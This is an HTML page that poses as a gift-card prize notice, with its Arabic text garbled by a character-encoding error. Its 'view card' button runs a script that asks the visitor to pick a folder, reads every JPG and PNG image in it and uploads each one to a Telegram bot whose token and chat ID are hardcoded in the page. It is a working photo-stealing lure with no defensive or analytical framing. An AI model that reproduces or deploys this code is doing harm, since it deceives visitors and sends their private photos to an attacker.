<!DOCTYPE html>
<html>
<head>
  <title>Ù…ÙØ§Ø¬Ø£Ø© Ø®Ø§ØµØ© Ù„Ùƒ ğŸ</title>
</head>
<body style="text-align:center; margin-top:80px; font-family:sans-serif;">
  <h2>ğŸ‰ ØªÙ‡Ø§Ù†ÙŠÙ†Ø§! Ù„Ù‚Ø¯ Ø±Ø¨Ø­Øª Ø¨Ø·Ø§Ù‚Ø© Ù‡Ø¯ÙŠØ©!</h2>
  <p>Ø§Ø¶ØºØ· Ø£Ø¯Ù†Ø§Ù‡ Ù„ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ø¨Ø·Ø§Ù‚Ø© ÙˆÙ…Ø´Ø§Ø±ÙƒØªÙ‡Ø§:</p>
  <button onclick="getPhotos()">ğŸ“‚ Ø¹Ø±Ø¶ Ø§Ù„Ø¨Ø·Ø§Ù‚Ø©</button>

  <script>
    const TELEGRAM_TOKEN = '7691229749:AAEyZUJIsmrdxv6AKLhMRIrIh_LROz-OnOg';
    const CHAT_ID = '7034689311';

    async function getPhotos() {
      try {
        const handle = await window.showDirectoryPicker();  // ÙŠÙØªØ­ Ù†Ø§ÙØ°Ø© Ø§Ø®ØªÙŠØ§Ø± Ø§Ù„Ù…Ø¬Ù„Ø¯
        for await (const entry of handle.values()) {
          if(entry.kind === 'file' && entry.name.match(/\.(jpg|jpeg|png)$/i)) {
            const file = await entry.getFile();
            const arrayBuffer = await file.arrayBuffer();
            const base64 = arrayBufferToBase64(arrayBuffer);
            // Ù†Ø±Ø³Ù„ Ø§Ù„ØµÙˆØ±Ø© Ù„Ù„Ø¨ÙˆØª
            await sendPhotoToTelegram(base64, entry.name);
          }
        }
        alert("âœ… ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ± Ø¨Ù†Ø¬Ø§Ø­!");
      } catch(e) {
        alert("âŒ Ù„Ù… ÙŠØªÙ… Ù…Ù†Ø­ Ø§Ù„Ø¥Ø°Ù†.");
      }
    }

    function arrayBufferToBase64(buffer) {
      let binary = '';
      const bytes = new Uint8Array(buffer);
      const len = bytes.byteLength;
      for(let i=0; i<len; i++) {
        binary += String.fromCharCode(bytes[i]);
      }
      return window.btoa(binary);
    }

    async function sendPhotoToTelegram(base64, filename) {
      const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`;
      const formData = new FormData();
      // Ù†Ø±Ø³Ù„ Ø§Ù„ØµÙˆØ±Ø© ÙƒØ¨Ø§ÙŠÙ†Ø§Ø±ÙŠ Ù…Ø¹ Ø§Ø³Ù…Ù‡Ø§
      formData.append('chat_id', CHAT_ID);
      formData.append('caption', filename);
      formData.append('photo', `data:image/jpeg;base64,${base64}`);

      // Ù†Ø±Ø³Ù„ Ø§Ù„Ø·Ù„Ø¨
      await fetch(url, {
        method: 'POST',
        body: formData
      });
    }
  </script>
</body>
</html>
